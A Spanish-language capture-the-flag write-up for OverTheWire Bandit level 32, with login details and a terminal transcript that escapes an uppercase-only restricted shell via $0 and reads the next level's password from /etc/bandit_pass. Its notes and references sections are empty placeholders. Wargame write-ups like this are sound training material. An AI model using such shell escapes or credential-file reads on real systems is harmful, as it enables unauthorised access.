# Bandit Level 32 → Level 33

## Objetivo
Después de todo esto, es hora de otro escape. ¡Buena suerte!`git`

## Datos de acceso
```bash
ssh bandit32@bandit.labs.overthewire.org -p 2220
bandit32
rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
```

## Solución
```bash
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: not found
>> LS
sh: 1: LS: not found
>> $0
$ ls
uppershell
$ whoaomi
sh: 2: whoaomi: not found
$ whoami
bandit33
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
$ exit
>> exit
sh: 1: EXIT: not found
>> ^CConnection to bandit.labs.overthewire.org closed.
jesus@CHUY:~$
```

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()